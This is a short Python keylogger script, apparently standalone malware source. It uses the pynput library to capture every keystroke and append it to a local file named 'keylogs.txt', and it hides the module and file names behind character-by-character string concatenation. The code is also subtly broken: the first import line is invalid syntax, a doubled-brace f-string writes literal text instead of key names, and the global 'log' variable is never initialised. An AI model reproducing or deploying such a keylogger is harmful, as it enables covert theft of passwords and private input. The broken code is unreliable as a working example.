import __import__('p'+'y'+'n'+'p'+'u'+'t') as pynput
from pynput import keyboard
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += ' '
        else:
            log += f'[{{key.name.upper()}}]'
def on_release(key):
    global log
    write_file(log)
    log = ''
    if key == keyboard.Key.esc:
        return False
def write_file(data):
    with open('k'+'e'+'y'+'l'+'o'+'g'+'s'+'.t'+'x'+'t', 'a') as f:
        f.write(data)
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()